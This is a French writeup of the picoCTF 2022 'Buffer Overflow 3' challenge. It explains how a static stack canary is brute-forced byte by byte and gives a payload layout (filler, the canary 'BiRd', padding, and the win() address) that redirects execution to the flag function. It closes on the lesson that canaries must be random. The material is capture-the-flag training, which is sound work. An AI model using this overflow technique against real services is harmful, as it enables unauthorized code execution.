# Buffer Overflow 3 — picoCTF 2022 (Writeup)

**Catégorie :** Binary Exploitation
**Difficulté :** Hard
**Auteurs du challenge :** Sanjay C / Palash Oswal
**Plateforme :** CyLab Security Academy / picoCTF 2022

---

## 1. Contexte

Le challenge fournit un binaire `vuln` (32 bits, x86) protégé par un **stack canary**, ainsi que son code source `vuln.c`. L'objectif est de contourner cette protection pour rediriger l'exécution vers la fonction `win()`, qui affiche le contenu de `flag.txt`.

### Connexion au service

```bash
nc saturn.picoctf.net <PORT>
```

---

## 2. Analyse du code source (`vuln.c`)

Points clés :

```c
#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

char global_canary[CANARY_SIZE]; // canary lu UNE SEULE FOIS depuis canary.txt

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   ...
   read(0,buf,count);          // <-- overflow possible si count > BUFSIZE

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected *****\n");
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
}
```

**Vulnérabilité principale : canary statique.**
Le canary est lu une seule fois au démarrage du programme depuis `canary.txt` et reste **identique à chaque connexion**. Il ne varie pas comme un vrai canary ASLR généré aléatoirement à chaque exécution. Cela le rend vulnérable à une attaque par **brute-force octet par octet**.

### Localisation de `win()`

```bash
objdump -d vuln | grep -A 2 "win"
```

```
08049336 <win>:
 8049336: f3 0f 1e fb    endbr32
 804933a: 55             pushl  %ebp
```

→ Adresse cible : `0x08049336`

---

## 3. Stratégie d'exploitation

### Étape 1 — Brute-force du canary (byte par byte)

Le canary fait 4 octets (`CANARY_SIZE = 4`). Pour chaque octet (0 à 255) :

1. Envoyer un payload de `64 (buf) + octets_canary_déjà_trouvés + 1 octet à tester`.
2. Si le serveur répond `Ok... Now Where's the Flag?` → l'octet est correct.
3. Si le serveur répond `***** Stack Smashing Detected *****` → mauvais octet, essayer le suivant.

Canary trouvé : **`b"BiRd"`** (`0x42 0x69 0x52 0x64`).

### Étape 2 — Détermination de l'offset EBP réel

La disposition mémoire théorique attendue était :

```
[ 64 octets buf ] [ 4 octets canary ] [ 4 octets EBP ] [ 4 octets @retour ]
```

Mais un test avec `EBP_pad = 4` n'a pas déclenché `win()` (pas de crash, mais pas de flag non plus). Cela s'explique par les variables locales supplémentaires (`length[64]`, `count`, `x`) et l'alignement mémoire imposé par le compilateur, qui ajoutent du padding entre le canary et l'adresse de retour réelle.

**Solution :** tester plusieurs valeurs de padding (0, 4, 8, 12, 16, 20...) automatiquement.

### Étape 3 — Construction du payload final

```
payload = b"A" * 64        # remplit buf
        + canary            # b"BiRd" (évite Stack Smashing)
        + b"B" * EBP_PAD    # padding variable jusqu'à l'adresse de retour
        + p32(0x08049336)   # adresse de win()
```

**Padding EBP correct trouvé : 16 octets.**

---

## 4. Résultat

```
pad=16 -> Ok... Now Where's the Flag?
picoCTF{Stat1C_c4n4r13s_4R3_b4D_********}
```

**Flag : `picoCTF{Stat1C_c4n4r13s_4R3_b4D_********}`** *(suffixe masqué, flag propre à l'instance)*

---

## 5. Leçon retenue

Le nom du flag résume la faille : *"Static canaries are bad"*. Un canary de pile doit être **régénéré aléatoirement à chaque exécution du programme** (comme le fait GCC/glibc normalement via `/dev/urandom`). Ici, comme il est lu une seule fois depuis un fichier statique et reste constant sur toutes les connexions, il devient trivialement contournable par brute-force, ce qui annule complètement l'intérêt de la protection stack canary.

---

## 6. Outils utilisés

- `pwntools` (Python) — automatisation des connexions et de l'envoi de payloads
- `objdump` — désassemblage pour localiser `win()`
- `nc` — tests manuels de connexion

---

## 7. Chronologie de la résolution

1. Analyse du binaire et du code source (`vuln.c`)
2. Localisation de l'adresse de `win()` via `objdump`
3. Installation de l'environnement Python (`venv` + `pwntools`)
4. Script de brute-force du canary, byte par byte (4 itérations, ~256 tentatives max chacune)
5. Premier essai d'exploitation avec padding EBP = 4 octets → échec silencieux
6. Script de balayage automatique du padding EBP (0 à 36 par pas de 4)
7. Succès avec padding EBP = 16 octets → flag obtenu
